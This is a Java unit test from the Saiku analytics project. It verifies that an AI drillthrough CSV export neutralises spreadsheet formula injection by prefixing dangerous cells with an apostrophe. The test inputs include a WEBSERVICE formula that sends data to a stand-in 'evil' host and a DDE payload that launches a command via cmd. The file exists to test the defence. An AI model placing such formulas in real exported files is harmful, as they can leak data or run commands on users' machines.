/*
 *   Copyright 2026 Spicule Ltd
 *   Apache License, Version 2.0.
 */
package org.saiku.web.rest.resources;

import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertTrue;

import java.nio.charset.StandardCharsets;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.Statement;
import org.junit.Test;
import org.saiku.service.olap.ThinQueryService;

/**
 * saiku#1051 wiring coverage. The AI drillthrough CSV export endpoint must stream through the
 * shared, hardened {@link org.saiku.service.util.export.CsvExporter} (the #1271 formula-injection
 * neutralisation) via {@link ThinQueryService#exportResultSetCsv(ResultSet)} — NOT a separate raw
 * writer. This drives that export path with a malicious cell in a real (in-memory H2) JDBC
 * {@link ResultSet} — exactly the shape a drillthrough produces — and asserts the {@code '} defang
 * lands in the exported bytes. Reroute the AI path to a raw CSV writer and this goes RED. (Also
 * covers the {@code ResultSet} export path, which #1273's {@code CellDataSet} wiring test did not
 * reach; no Mockito is available in this module, so a real H2 result is used.)
 */
public class AiDrillthroughCsvWiringTest {

    /** Export a one-row VARCHAR result containing {@code value} through the AI drillthrough CSV path. */
    private static String exportCell(String value) throws Exception {
        String url = "jdbc:h2:mem:aicsv_" + System.nanoTime();
        try (Connection con = DriverManager.getConnection(url);
                Statement st = con.createStatement()) {
            st.execute("CREATE TABLE t (product VARCHAR(255))");
            try (PreparedStatement ins = con.prepareStatement("INSERT INTO t VALUES (?)")) {
                ins.setString(1, value);
                ins.executeUpdate();
            }
            try (ResultSet rs = st.executeQuery("SELECT product FROM t")) {
                return new String(new ThinQueryService().exportResultSetCsv(rs), StandardCharsets.UTF_8);
            }
        }
    }

    @Test
    public void aiDrillthroughCsv_neutralisesFormulaCell() throws Exception {
        String csv = exportCell("=WEBSERVICE(\"http://evil/exfil\")");
        assertTrue(
                "AI drillthrough CSV must defang formula cells via the hardened exporter: " + csv,
                csv.contains("'=WEBSERVICE"));
    }

    @Test
    public void aiDrillthroughCsv_neutralisesMinusFormulaCell() throws Exception {
        // The classic '-2+3+cmd…' attack: starts with '-' but is NOT a number, so it must defang.
        String csv = exportCell("-2+3+cmd|'/C calc'!A0");
        assertTrue("AI drillthrough CSV must defang minus-formula cells: " + csv, csv.contains("'-2+3+cmd"));
    }

    @Test
    public void aiDrillthroughCsv_leavesBenignCellUnquoted() throws Exception {
        String csv = exportCell("Beer");
        assertTrue("benign data exports unchanged: " + csv, csv.contains("Beer"));
        assertFalse("benign text must not be defanged: " + csv, csv.contains("'Beer"));
    }
}
